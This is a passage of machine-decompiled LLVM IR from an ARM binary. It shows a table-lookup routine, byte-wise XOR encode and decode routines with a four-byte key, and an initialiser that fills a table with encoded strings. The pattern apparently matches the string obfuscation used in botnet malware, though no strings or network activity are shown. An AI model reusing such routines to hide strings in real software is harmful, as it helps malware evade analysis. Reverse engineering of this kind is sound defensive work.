  uselistorder label %dec_label_pc_1111c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_11104, { 1, 0 }
  uselistorder label %dec_label_pc_10f44, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10f2c, { 1, 0 }
  uselistorder label %dec_label_pc_10e70, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10e58, { 1, 0 }
  uselistorder label %dec_label_pc_10d3c, { 7, 8, 3, 4, 1, 0, 2, 5, 6 }
  uselistorder label %bb346, { 1, 0 }
  uselistorder label %bb344, { 1, 0 }
  uselistorder label %dec_label_pc_10c84, { 1, 0 }
  uselistorder label %.thread50, { 1, 0 }
  uselistorder label %dec_label_pc_10c34, { 1, 0 }
  uselistorder label %dec_label_pc_10c24, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10c1cthread-pre-split.thread477, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10c1cthread-pre-split.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10c24.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10c18.loopexit, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10c00, { 1, 0 }
  uselistorder label %dec_label_pc_10b40, { 1, 0 }
  uselistorder label %bb340, { 1, 0 }
  uselistorder label %bb338, { 1, 0 }
  uselistorder label %bb336, { 1, 0 }
  uselistorder label %bb334, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_10a34.dec_label_pc_10a34_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10a10.dec_label_pc_10a10_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10a04, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_109fc, { 1, 0 }
  uselistorder label %dec_label_pc_109d4, { 1, 0 }
  uselistorder label %dec_label_pc_109b0, { 1, 0 }
  uselistorder label %dec_label_pc_10864, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_10858, { 1, 0 }
  uselistorder label %dec_label_pc_106e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_106c4, { 1, 0 }
  uselistorder label %dec_label_pc_106b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10694, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10670, { 1, 0 }
  uselistorder label %bb312, { 1, 0 }
  uselistorder label %dec_label_pc_1061c, { 22, 6, 12, 2, 13, 3, 14, 4, 15, 5, 16, 0, 17, 18, 19, 20, 21, 7, 8, 9, 1, 10, 11, 23 }
  uselistorder label %dec_label_pc_1012c, { 1, 0 }
}

define i32 @function_119d0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_119d0:
  store i32 ptrtoint (i32* @global_var_22938.339 to i32), i32* @r2, align 4
  %v3_119d4 = mul i32 %arg1, 8
  %v2_119d8 = add i32 %v3_119d4, ptrtoint (i32* @global_var_22938.339 to i32)
  %v2_119dc = icmp eq i32* %arg2, null
  br i1 %v2_119dc, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_119d0
  %v3_119e44 = inttoptr i32 %v2_119d8 to i32*
  %v4_119e45 = load i32, i32* %v3_119e44, align 4
  br label %bb7

bb:                                               ; preds = %dec_label_pc_119d0
  %v2_119e0 = add i32 %v3_119d4, add (i32 ptrtoint (i32* @global_var_22938.339 to i32), i32 4)
  %v3_119e0 = inttoptr i32 %v2_119e0 to i16*
  %v4_119e0 = load i16, i16* %v3_119e0, align 4
  %v5_119e0 = zext i16 %v4_119e0 to i32
  %v3_119e4 = inttoptr i32 %v2_119d8 to i32*
  %v4_119e4 = load i32, i32* %v3_119e4, align 4
  store i32 %v5_119e0, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_119e46 = phi i32 [ %v4_119e45, %.thread ], [ %v4_119e4, %bb ]
  ret i32 %v4_119e46

; uselistorder directives
  uselistorder i32 %v2_119d8, { 1, 0 }
  uselistorder i32 %v3_119d4, { 1, 0 }
  uselistorder i32* null, { 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 1, 18, 21, 19, 20, 34, 22, 4, 23, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 33 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_119f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_119f4:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_119fc = mul i32 %arg1, 8
  %v2_11a00 = add i32 %v3_119fc, ptrtoint (i32* @global_var_22938.339 to i32)
  %v2_11a04 = load i32, i32* @global_var_222f8.342, align 4
  %v1_11a08 = add i32 %v3_119fc, add (i32 ptrtoint (i32* @global_var_22938.339 to i32), i32 4)
  %v2_11a08 = inttoptr i32 %v1_11a08 to i16*
  %v3_11a08 = load i16, i16* %v2_11a08, align 4
  %v3_11a0c = udiv i32 %v2_11a04, 256
  %v2_11a10 = icmp eq i16 %v3_11a08, 0
  %v3_11a14 = udiv i32 %v2_11a04, 65536
  %v3_11a18 = load i32, i32* @r4, align 4
  store i32 %v3_11a18, i32* %stack_var_-16, align 4
  %v1_11a1c = urem i32 %v3_11a0c, 256
  store i32 %v1_11a1c, i32* %r6.global-to-local, align 4
  %v1_11a20 = urem i32 %v3_11a14, 256
  store i32 %v1_11a20, i32* %r5.global-to-local, align 4
  %v3_11a24 = udiv i32 %v2_11a04, 16777216
  store i32 %v3_11a24, i32* %r4.global-to-local, align 4
  %v1_11a28 = urem i32 %v2_11a04, 256
  store i32 %v1_11a28, i32* %lr.global-to-local, align 4
  br i1 %v2_11a10, label %dec_label_pc_11a84, label %dec_label_pc_11a30

dec_label_pc_11a30:                               ; preds = %dec_label_pc_119f4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_11a34 = inttoptr i32 %v2_11a00 to i32*
  br label %dec_label_pc_11a34

dec_label_pc_11a34:                               ; preds = %dec_label_pc_11a34.dec_label_pc_11a34_crit_edge, %dec_label_pc_11a30
  %v0_11a3c = phi i32 [ %v0_11a3c.pre, %dec_label_pc_11a34.dec_label_pc_11a34_crit_edge ], [ %v1_11a28, %dec_label_pc_11a30 ]
  %v2_11a40 = phi i32 [ %v1_11a78, %dec_label_pc_11a34.dec_label_pc_11a34_crit_edge ], [ 0, %dec_label_pc_11a30 ]
  %v2_11a34 = load i32, i32* %v1_11a34, align 4
  %v2_11a38 = add i32 %v2_11a34, %v2_11a40
  %v3_11a38 = inttoptr i32 %v2_11a38 to i8*
  %v4_11a38 = load i8, i8* %v3_11a38, align 1
  %v6_11a38 = zext i8 %v4_11a38 to i32
  %v2_11a3c = xor i32 %v6_11a38, %v0_11a3c
  %v1_11a40 = trunc i32 %v2_11a3c to i8
  store i8 %v1_11a40, i8* %v3_11a38, align 1
  %v2_11a44 = load i32, i32* %v1_11a34, align 4
  %v0_11a48 = load i32, i32* %ip.global-to-local, align 4
  %v2_11a48 = add i32 %v0_11a48, %v2_11a44
  %v3_11a48 = inttoptr i32 %v2_11a48 to i8*
  %v4_11a48 = load i8, i8* %v3_11a48, align 1
  %v6_11a48 = zext i8 %v4_11a48 to i32
  %v0_11a4c = load i32, i32* %r6.global-to-local, align 4
  %v2_11a4c = xor i32 %v0_11a4c, %v6_11a48
  %v1_11a50 = trunc i32 %v2_11a4c to i8
  store i8 %v1_11a50, i8* %v3_11a48, align 1
  %v2_11a54 = load i32, i32* %v1_11a34, align 4
  %v0_11a58 = load i32, i32* %ip.global-to-local, align 4
  %v2_11a58 = add i32 %v0_11a58, %v2_11a54
  %v3_11a58 = inttoptr i32 %v2_11a58 to i8*
  %v4_11a58 = load i8, i8* %v3_11a58, align 1
  %v6_11a58 = zext i8 %v4_11a58 to i32
  %v0_11a5c = load i32, i32* %r5.global-to-local, align 4
  %v2_11a5c = xor i32 %v0_11a5c, %v6_11a58
  %v1_11a60 = trunc i32 %v2_11a5c to i8
  store i8 %v1_11a60, i8* %v3_11a58, align 1
  %v2_11a64 = load i32, i32* %v1_11a34, align 4
  %v0_11a68 = load i32, i32* %ip.global-to-local, align 4
  %v2_11a68 = add i32 %v0_11a68, %v2_11a64
  %v3_11a68 = inttoptr i32 %v2_11a68 to i8*
  %v4_11a68 = load i8, i8* %v3_11a68, align 1
  %v6_11a68 = zext i8 %v4_11a68 to i32
  %v0_11a6c = load i32, i32* %r4.global-to-local, align 4
  %v2_11a6c = xor i32 %v0_11a6c, %v6_11a68
  %v1_11a70 = trunc i32 %v2_11a6c to i8
  store i8 %v1_11a70, i8* %v3_11a68, align 1
  %v3_11a74 = load i16, i16* %v2_11a08, align 4
  %v4_11a74 = zext i16 %v3_11a74 to i32
  %v0_11a78 = load i32, i32* %ip.global-to-local, align 4
  %v1_11a78 = add i32 %v0_11a78, 1
  store i32 %v1_11a78, i32* %ip.global-to-local, align 4
  %v8_11a80 = icmp sgt i32 %v4_11a74, %v1_11a78
  br i1 %v8_11a80, label %dec_label_pc_11a34.dec_label_pc_11a34_crit_edge, label %dec_label_pc_11a84.loopexit

dec_label_pc_11a34.dec_label_pc_11a34_crit_edge:  ; preds = %dec_label_pc_11a34
  %v0_11a3c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11a34

dec_label_pc_11a84.loopexit:                      ; preds = %dec_label_pc_11a34
  %v2_11a84.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11a84

dec_label_pc_11a84:                               ; preds = %dec_label_pc_11a84.loopexit, %dec_label_pc_119f4
  %v2_11a84 = phi i32 [ %v2_11a84.pre, %dec_label_pc_11a84.loopexit ], [ %v3_11a18, %dec_label_pc_119f4 ]
  store i32 %v2_11a84, i32* @r4, align 4
  ret i32 %v2_11a00

; uselistorder directives
  uselistorder i32 %v1_11a78, { 1, 2, 0 }
  uselistorder i32 %v1_11a28, { 1, 0 }
  uselistorder i32 %v2_11a04, { 3, 0, 1, 2 }
  uselistorder i32 %v3_119fc, { 1, 0 }
}

define i32 @function_11a94(i32 %arg1) local_unnamed_addr {
dec_label_pc_11a94:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11a9c = mul i32 %arg1, 8
  %v2_11aa0 = add i32 %v3_11a9c, ptrtoint (i32* @global_var_22938.339 to i32)
  %v2_11aa4 = load i32, i32* @global_var_222f8.342, align 4
  %v1_11aa8 = add i32 %v3_11a9c, add (i32 ptrtoint (i32* @global_var_22938.339 to i32), i32 4)
  %v2_11aa8 = inttoptr i32 %v1_11aa8 to i16*
  %v3_11aa8 = load i16, i16* %v2_11aa8, align 4
  %v3_11aac = udiv i32 %v2_11aa4, 256
  store i32 %v3_11aac, i32* @r2, align 4
  %v2_11ab0 = icmp eq i16 %v3_11aa8, 0
  %v3_11ab4 = udiv i32 %v2_11aa4, 65536
  %v3_11ab8 = load i32, i32* @r4, align 4
  store i32 %v3_11ab8, i32* %stack_var_-16, align 4
  %v1_11abc = urem i32 %v3_11aac, 256
  store i32 %v1_11abc, i32* %r6.global-to-local, align 4
  %v1_11ac0 = urem i32 %v3_11ab4, 256
  store i32 %v1_11ac0, i32* %r5.global-to-local, align 4
  %v3_11ac4 = udiv i32 %v2_11aa4, 16777216
  store i32 %v3_11ac4, i32* %r4.global-to-local, align 4
  %v1_11ac8 = urem i32 %v2_11aa4, 256
  store i32 %v1_11ac8, i32* %lr.global-to-local, align 4
  br i1 %v2_11ab0, label %dec_label_pc_11b24, label %dec_label_pc_11ad0

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11a94
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_11ad4 = inttoptr i32 %v2_11aa0 to i32*
  br label %dec_label_pc_11ad4

dec_label_pc_11ad4:                               ; preds = %dec_label_pc_11ad4.dec_label_pc_11ad4_crit_edge, %dec_label_pc_11ad0
  %v0_11adc = phi i32 [ %v0_11adc.pre, %dec_label_pc_11ad4.dec_label_pc_11ad4_crit_edge ], [ %v1_11ac8, %dec_label_pc_11ad0 ]
  %v2_11ae0 = phi i32 [ %v1_11b18, %dec_label_pc_11ad4.dec_label_pc_11ad4_crit_edge ], [ 0, %dec_label_pc_11ad0 ]
  %v2_11ad4 = load i32, i32* %v1_11ad4, align 4
  %v2_11ad8 = add i32 %v2_11ad4, %v2_11ae0
  %v3_11ad8 = inttoptr i32 %v2_11ad8 to i8*
  %v4_11ad8 = load i8, i8* %v3_11ad8, align 1
  %v6_11ad8 = zext i8 %v4_11ad8 to i32
  %v2_11adc = xor i32 %v6_11ad8, %v0_11adc
  %v1_11ae0 = trunc i32 %v2_11adc to i8
  store i8 %v1_11ae0, i8* %v3_11ad8, align 1
  %v2_11ae4 = load i32, i32* %v1_11ad4, align 4
  %v0_11ae8 = load i32, i32* %ip.global-to-local, align 4
  %v2_11ae8 = add i32 %v0_11ae8, %v2_11ae4
  %v3_11ae8 = inttoptr i32 %v2_11ae8 to i8*
  %v4_11ae8 = load i8, i8* %v3_11ae8, align 1
  %v6_11ae8 = zext i8 %v4_11ae8 to i32
  %v0_11aec = load i32, i32* %r6.global-to-local, align 4
  %v2_11aec = xor i32 %v0_11aec, %v6_11ae8
  %v1_11af0 = trunc i32 %v2_11aec to i8
  store i8 %v1_11af0, i8* %v3_11ae8, align 1
  %v2_11af4 = load i32, i32* %v1_11ad4, align 4
  %v0_11af8 = load i32, i32* %ip.global-to-local, align 4
  %v2_11af8 = add i32 %v0_11af8, %v2_11af4
  %v3_11af8 = inttoptr i32 %v2_11af8 to i8*
  %v4_11af8 = load i8, i8* %v3_11af8, align 1
  %v6_11af8 = zext i8 %v4_11af8 to i32
  %v0_11afc = load i32, i32* %r5.global-to-local, align 4
  %v2_11afc = xor i32 %v0_11afc, %v6_11af8
  %v1_11b00 = trunc i32 %v2_11afc to i8
  store i8 %v1_11b00, i8* %v3_11af8, align 1
  %v2_11b04 = load i32, i32* %v1_11ad4, align 4
  %v0_11b08 = load i32, i32* %ip.global-to-local, align 4
  %v2_11b08 = add i32 %v0_11b08, %v2_11b04
  %v3_11b08 = inttoptr i32 %v2_11b08 to i8*
  %v4_11b08 = load i8, i8* %v3_11b08, align 1
  %v6_11b08 = zext i8 %v4_11b08 to i32
  %v0_11b0c = load i32, i32* %r4.global-to-local, align 4
  %v2_11b0c = xor i32 %v0_11b0c, %v6_11b08
  %v1_11b10 = trunc i32 %v2_11b0c to i8
  store i8 %v1_11b10, i8* %v3_11b08, align 1
  %v3_11b14 = load i16, i16* %v2_11aa8, align 4
  %v4_11b14 = zext i16 %v3_11b14 to i32
  store i32 %v4_11b14, i32* @r2, align 4
  %v0_11b18 = load i32, i32* %ip.global-to-local, align 4
  %v1_11b18 = add i32 %v0_11b18, 1
  store i32 %v1_11b18, i32* %ip.global-to-local, align 4
  %v8_11b20 = icmp sgt i32 %v4_11b14, %v1_11b18
  br i1 %v8_11b20, label %dec_label_pc_11ad4.dec_label_pc_11ad4_crit_edge, label %dec_label_pc_11b24.loopexit

dec_label_pc_11ad4.dec_label_pc_11ad4_crit_edge:  ; preds = %dec_label_pc_11ad4
  %v0_11adc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11ad4

dec_label_pc_11b24.loopexit:                      ; preds = %dec_label_pc_11ad4
  %v2_11b24.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11b24

dec_label_pc_11b24:                               ; preds = %dec_label_pc_11b24.loopexit, %dec_label_pc_11a94
  %v2_11b24 = phi i32 [ %v2_11b24.pre, %dec_label_pc_11b24.loopexit ], [ %v3_11ab8, %dec_label_pc_11a94 ]
  store i32 %v2_11b24, i32* @r4, align 4
  ret i32 %v2_11aa0

; uselistorder directives
  uselistorder i32 %v1_11b18, { 1, 2, 0 }
  uselistorder i32 %v1_11ac8, { 1, 0 }
  uselistorder i32 %v3_11aac, { 1, 0 }
  uselistorder i32 %v2_11aa4, { 3, 0, 1, 2 }
  uselistorder i32 %v2_11aa0, { 1, 0 }
  uselistorder i32 %v3_11a9c, { 1, 0 }
}

define i32 @function_11b34() local_unnamed_addr {
dec_label_pc_11b34:
  %r5.global-to-local = alloca i32, align 4
  %v6_11b34 = load i32, i32* @r5, align 4
  store i32 12, i32* @r0, align 4
  %v0_11b40 = call i32 @function_13c7c()
  store i32 ptrtoint ([13 x i8]* @global_var_19a30.346 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_22938.339 to i32), i32* @r4, align 4
  store i32 12, i32* @r7, align 4
  store i32 %v0_11b40, i32* @r5, align 4
  %v4_11b5c = call i32 @function_12394(i32 %v0_11b40, i32 ptrtoint ([13 x i8]* @global_var_19a30.346 to i32), i32 12)
  store i32 2, i32* @r0, align 4
  %v0_11b64 = load i32, i32* @r5, align 4
  store i32 %v0_11b64, i32* @global_var_22950.348, align 4
  %v0_11b68 = load i32, i32* @r7, align 4
  %v1_11b68 = trunc i32 %v0_11b68 to i16
  store i16 %v1_11b68, i16* bitcast (i32* @global_var_22954.349 to i16*), align 4
  %v0_11b6c = call i32 @function_13c7c()
  store i32 2, i32* @r5, align 4
  store i32 %v0_11b6c, i32* @r6, align 4
  %v3_11b80 = call i32 @function_12394(i32 %v0_11b6c, i32 ptrtoint (i32* @global_var_19a40.351 to i32), i32 2)
  %v0_11b84 = load i32, i32* @r7, align 4
  store i32 %v0_11b84, i32* @r0, align 4
  %v0_11b88 = load i32, i32* @r6, align 4
  store i32 %v0_11b88, i32* @global_var_22958.352, align 4
  %v0_11b8c = load i32, i32* @r5, align 4
  %v1_11b8c = trunc i32 %v0_11b8c to i16
  store i16 %v1_11b8c, i16* bitcast (i32* @global_var_2295c.353 to i16*), align 4
  %v0_11b90 = call i32 @function_13c7c()
  %v0_11b94 = load i32, i32* @r8, align 4
  %v0_11b98 = load i32, i32* @r7, align 4
  store i32 %v0_11b90, i32* @r6, align 4
  %v4_11ba0 = call i32 @function_12394(i32 %v0_11b90, i32 %v0_11b94, i32 %v0_11b98)
  %v0_11ba4 = load i32, i32* @r5, align 4
  store i32 %v0_11ba4, i32* @r0, align 4
  %v0_11ba8 = load i32, i32* @r6, align 4
  store i32 %v0_11ba8, i32* @global_var_229c8.354, align 4
  %v0_11bac = load i32, i32* @r7, align 4
  %v1_11bac = trunc i32 %v0_11bac to i16
  store i16 %v1_11bac, i16* bitcast (i32* @global_var_229cc.355 to i16*), align 4
  %v0_11bb0 = call i32 @function_13c7c()
  %v0_11bb4 = load i32, i32* @r5, align 4
  store i32 %v0_11bb0, i32* @r6, align 4
  %v3_11bc0 = call i32 @function_12394(i32 %v0_11bb0, i32 ptrtoint (i32* @global_var_19a44.357 to i32), i32 %v0_11bb4)
  store i32 15, i32* @r0, align 4
  %v0_11bc8 = load i32, i32* @r6, align 4
  store i32 %v0_11bc8, i32* @global_var_229d0.358, align 4
  %v0_11bcc = load i32, i32* @r5, align 4
  %v1_11bcc = trunc i32 %v0_11bcc to i16
  store i16 %v1_11bcc, i16* bitcast (i32* @global_var_229d4.359 to i16*), align 4
  %v0_11bd0 = call i32 @function_13c7c()
  store i32 %v0_11bd0, i32* @r5, align 4
  %v3_11be0 = call i32 @function_12394(i32 %v0_11bd0, i32 ptrtoint (i32* @global_var_19a48.361 to i32), i32 15)
  store i32 29, i32* @r0, align 4
  %v0_11bec = load i32, i32* @r5, align 4
  store i32 %v0_11bec, i32* @global_var_22948.362, align 4
  store i16 15, i16* bitcast (i32* @global_var_2294c.363 to i16*), align 4
  %v0_11bf4 = call i32 @function_13c7c()
  store i32 %v0_11bf4, i32* @r5, align 4
  %v3_11c04 = call i32 @function_12394(i32 %v0_11bf4, i32 ptrtoint (i32* @global_var_19a58.365 to i32), i32 29)
  store i32 7, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_22964.366 to i16*), align 4
  %v0_11c14 = load i32, i32* @r5, align 4
  store i32 %v0_11c14, i32* @global_var_22960.367, align 4
  %v0_11c18 = call i32 @function_13c7c()
  store i32 7, i32* @r6, align 4
  store i32 %v0_11c18, i32* @r5, align 4
  %v4_11c2c = call i32 @function_12394(i32 %v0_11c18, i32 ptrtoint ([8 x i8]* @global_var_19a78.369 to i32), i32 7)
  store i32 5, i32* @r0, align 4
  %v0_11c34 = load i32, i32* @r5, align 4
  store i32 %v0_11c34, i32* @global_var_22968.370, align 4
  %v0_11c38 = load i32, i32* @r6, align 4
  %v1_11c38 = trunc i32 %v0_11c38 to i16
  store i16 %v1_11c38, i16* bitcast (i32* @global_var_2296c.371 to i16*), align 4
  %v0_11c3c = call i32 @function_13c7c()
  store i32 %v0_11c3c, i32* @r5, align 4
  %v4_11c4c = call i32 @function_12394(i32 %v0_11c3c, i32 ptrtoint ([6 x i8]* @global_var_19a80.373 to i32), i32 5)
  store i32 11, i32* @r0, align 4
  %v0_11c58 = load i32, i32* @r5, align 4
  store i32 %v0_11c58, i32* @global_var_22970.374, align 4
  store i16 5, i16* bitcast (i32* @global_var_22974.375 to i16*), align 4
  %v0_11c60 = call i32 @function_13c7c()
  store i32 11, i32* @fp, align 4
  store i32 %v0_11c60, i32* @r5, align 4
  %v3_11c74 = call i32 @function_12394(i32 %v0_11c60, i32 ptrtoint (i32* @global_var_19a88.377 to i32), i32 11)
  store i32 4, i32* @r0, align 4
  %v0_11c7c = load i32, i32* @r5, align 4
  store i32 %v0_11c7c, i32* @global_var_22978.378, align 4
  %v0_11c80 = load i32, i32* @fp, align 4
  %v1_11c80 = trunc i32 %v0_11c80 to i16
  store i16 %v1_11c80, i16* bitcast (i32* @global_var_2297c.379 to i16*), align 4
  %v0_11c84 = call i32 @function_13c7c()
  store i32 %v0_11c84, i32* @r5, align 4
  %v4_11c94 = call i32 @function_12394(i32 %v0_11c84, i32 ptrtoint ([5 x i8]* @global_var_19a94.381 to i32), i32 4)
  %v0_11c9c = load i32, i32* @r6, align 4
  store i32 %v0_11c9c, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_22984.382 to i16*), align 4
  %v0_11ca4 = load i32, i32* @r5, align 4
  store i32 %v0_11ca4, i32* @global_var_22980.383, align 4
  %v0_11ca8 = call i32 @function_13c7c()
  %v0_11cac = load i32, i32* @r6, align 4
  store i32 %v0_11ca8, i32* @r5, align 4
  %v4_11cb8 = call i32 @function_12394(i32 %v0_11ca8, i32 ptrtoint ([8 x i8]* @global_var_19a9c.385 to i32), i32 %v0_11cac)
  store i32 8, i32* @r0, align 4
  %v0_11cc0 = load i32, i32* @r5, align 4
  store i32 %v0_11cc0, i32* @global_var_22988.386, align 4
  %v0_11cc4 = load i32, i32* @r6, align 4
  %v1_11cc4 = trunc i32 %v0_11cc4 to i16
  store i16 %v1_11cc4, i16* bitcast (i32* @global_var_2298c.387 to i16*), align 4
  %v0_11cc8 = call i32 @function_13c7c()
  store i32 8, i32* @sl, align 4
  store i32 %v0_11cc8, i32* @r5, align 4
  %v4_11cdc = call i32 @function_12394(i32 %v0_11cc8, i32 ptrtoint ([9 x i8]* @global_var_19aa4.389 to i32), i32 8)
  store i32 13, i32* @r0, align 4
  %v0_11ce4 = load i32, i32* @r5, align 4
  store i32 %v0_11ce4, i32* @global_var_22990.390, align 4
  %v0_11ce8 = load i32, i32* @sl, align 4
  %v1_11ce8 = trunc i32 %v0_11ce8 to i16
  store i16 %v1_11ce8, i16* bitcast (i32* @global_var_22994.391 to i16*), align 4
  %v0_11cec = call i32 @function_13c7c()
  store i32 %v0_11cec, i32* @r5, align 4
  %v3_11cfc = call i32 @function_12394(i32 %v0_11cec, i32 ptrtoint (i32* @global_var_19ab0.393 to i32), i32 13)
  store i32 10, i32* @r0, align 4
  store i32 10, i32* @r8, align 4
  %v0_11d0c = load i32, i32* @r5, align 4
  store i32 %v0_11d0c, i32* @global_var_22998.394, align 4
  store i16 13, i16* bitcast (i32* @global_var_2299c.395 to i16*), align 4
  %v0_11d14 = call i32 @function_13c7c()
  %v0_11d1c = load i32, i32* @r8, align 4
  store i32 %v0_11d14, i32* @r5, align 4
  %v4_11d24 = call i32 @function_12394(i32 %v0_11d14, i32 ptrtoint ([11 x i8]* @global_var_19ac0.397 to i32), i32 %v0_11d1c)
  %v0_11d28 = load i32, i32* @r8, align 4
  store i32 %v0_11d28, i32* @r0, align 4
  %v0_11d2c = load i32, i32* @r5, align 4
  store i32 %v0_11d2c, i32* @global_var_229a0.398, align 4
  %v1_11d30 = trunc i32 %v0_11d28 to i16
  store i16 %v1_11d30, i16* bitcast (i32* @global_var_229a4.399 to i16*), align 4
  %v0_11d34 = call i32 @function_13c7c()
  %v0_11d3c = load i32, i32* @r8, align 4
  store i32 %v0_11d34, i32* @r5, align 4
  %v4_11d44 = call i32 @function_12394(i32 %v0_11d34, i32 ptrtoint ([11 x i8]* @global_var_19acc.401 to i32), i32 %v0_11d3c)
  store i32 33, i32* @r0, align 4
  %v0_11d4c = load i32, i32* @r5, align 4
  store i32 %v0_11d4c, i32* @global_var_229a8.402, align 4
  %v0_11d50 = load i32, i32* @r8, align 4
  %v1_11d50 = trunc i32 %v0_11d50 to i16
  store i16 %v1_11d50, i16* bitcast (i32* @global_var_229ac.403 to i16*), align 4
  %v0_11d54 = call i32 @function_13c7c()
  store i32 %v0_11d54, i32* @r5, align 4
  %v3_11d64 = call i32 @function_12394(i32 %v0_11d54, i32 ptrtoint (i32* @global_var_19ad8.405 to i32), i32 33)
  %v0_11d6c = load i32, i32* @sl, align 4
  store i32 %v0_11d6c, i32* @r0, align 4
  store i16 33, i16* bitcast (i32* @global_var_229b4.406 to i16*), align 4
  %v0_11d74 = load i32, i32* @r5, align 4
  store i32 %v0_11d74, i32* @global_var_229b0.407, align 4
  %v0_11d78 = call i32 @function_13c7c()
  %v0_11d80 = load i32, i32* @sl, align 4
  store i32 %v0_11d78, i32* @r5, align 4
  %v4_11d88 = call i32 @function_12394(i32 %v0_11d78, i32 ptrtoint ([9 x i8]* @global_var_19afc.409 to i32), i32 %v0_11d80)
  %v0_11d8c = load i32, i32* @fp, align 4
  store i32 %v0_11d8c, i32* @r0, align 4
  %v0_11d90 = load i32, i32* @r5, align 4
  store i32 %v0_11d90, i32* @global_var_229b8.410, align 4
  %v0_11d94 = load i32, i32* @sl, align 4
  %v1_11d94 = trunc i32 %v0_11d94 to i16
  store i16 %v1_11d94, i16* bitcast (i32* @global_var_229bc.411 to i16*), align 4
  %v0_11d98 = call i32 @function_13c7c()
  %v0_11da0 = load i32, i32* @fp, align 4
  store i32 %v0_11d98, i32* @r5, align 4
  %v4_11da8 = call i32 @function_12394(i32 %v0_11d98, i32 ptrtoint ([12 x i8]* @global_var_19b08.413 to i32), i32 %v0_11da0)
  store i32 6, i32* @r0, align 4
  %v0_11db0 = load i32, i32* @r5, align 4
  store i32 %v0_11db0, i32* @global_var_229c0.414, align 4
  %v0_11db4 = load i32, i32* @fp, align 4
  %v1_11db4 = trunc i32 %v0_11db4 to i16
  store i16 %v1_11db4, i16* bitcast (i32* @global_var_229c4.415 to i16*), align 4
  %v0_11db8 = call i32 @function_13c7c()
  store i32 %v0_11db8, i32* @r5, align 4
  %v4_11dc8 = call i32 @function_12394(i32 %v0_11db8, i32 ptrtoint ([7 x i8]* @global_var_19b14.417 to i32), i32 6)
  %v0_11dd0 = load i32, i32* @r6, align 4
  store i32 %v0_11dd0, i32* @r0, align 4
  %v0_11dd4 = load i32, i32* @r5, align 4
  store i32 %v0_11dd4, i32* @global_var_229d8.418, align 4
  store i16 6, i16* bitcast (i32* @global_var_229dc.419 to i16*), align 4
  %v0_11ddc = call i32 @function_13c7c()
  %v0_11de0 = load i32, i32* @r6, align 4
  store i32 %v0_11ddc, i32* @r5, align 4
  %v4_11dec = call i32 @function_12394(i32 %v0_11ddc, i32 ptrtoint ([8 x i8]* @global_var_19b1c.421 to i32), i32 %v0_11de0)
  %v0_11df0 = load i32, i32* @r6, align 4
  store i32 %v0_11df0, i32* @r0, align 4
  %v0_11df4 = load i32, i32* @r5, align 4
  store i32 %v0_11df4, i32* @global_var_229e0.422, align 4
  %v1_11df8 = trunc i32 %v0_11df0 to i16
  store i16 %v1_11df8, i16* bitcast (i32* @global_var_229e4.423 to i16*), align 4
  %v0_11dfc = call i32 @function_13c7c()
  %v0_11e00 = load i32, i32* @r6, align 4
  store i32 %v0_11dfc, i32* @r5, align 4
  %v4_11e0c = call i32 @function_12394(i32 %v0_11dfc, i32 ptrtoint ([8 x i8]* @global_var_19b24.425 to i32), i32 %v0_11e00)
  store i32 3, i32* @r0, align 4
  %v0_11e14 = load i32, i32* @r5, align 4
  store i32 %v0_11e14, i32* @global_var_229e8.426, align 4
  %v0_11e18 = load i32, i32* @r6, align 4
  %v1_11e18 = trunc i32 %v0_11e18 to i16
  store i16 %v1_11e18, i16* bitcast (i32* @global_var_229ec.427 to i16*), align 4
  %v0_11e1c = call i32 @function_13c7c()
  store i32 %v0_11e1c, i32* @r5, align 4
  %v4_11e2c = call i32 @function_12394(i32 %v0_11e1c, i32 ptrtoint ([4 x i8]* @global_var_19b2c.429 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_229f4.430 to i16*), align 4
  %v0_11e3c = load i32, i32* @r5, align 4
  store i32 %v0_11e3c, i32* @global_var_229f0.431, align 4
